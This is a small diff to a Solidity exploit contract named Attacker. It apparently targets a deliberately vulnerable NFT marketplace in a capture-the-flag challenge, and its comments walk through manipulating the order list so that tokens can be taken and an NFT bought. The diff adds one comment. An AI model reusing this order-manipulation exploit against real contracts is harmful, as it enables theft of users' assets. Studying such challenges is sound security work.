@@ -65,7 +65,7 @@ contract Attacker{
 
         // Step 2: Call the purchaseTest function with the vmaNFT address that we just passed to the VulnerableMarket -> This will create a new order
         // Actual state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337), (vmaNFT, NFT 1, 10)]
-        vulnerableMarket.purchaseTest(address(vmaNFT), 1, 10); 
+        vulnerableMarket.purchaseTest(address(vmaNFT), 1, 10); // No need to, we can just pass 1337 and take the tokens straight away
         // New state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337)]
         // After all we would get 1337 tsTokens and now we can buy the NFT 2
         vulnerableMarket.purchaseOrder(2); 
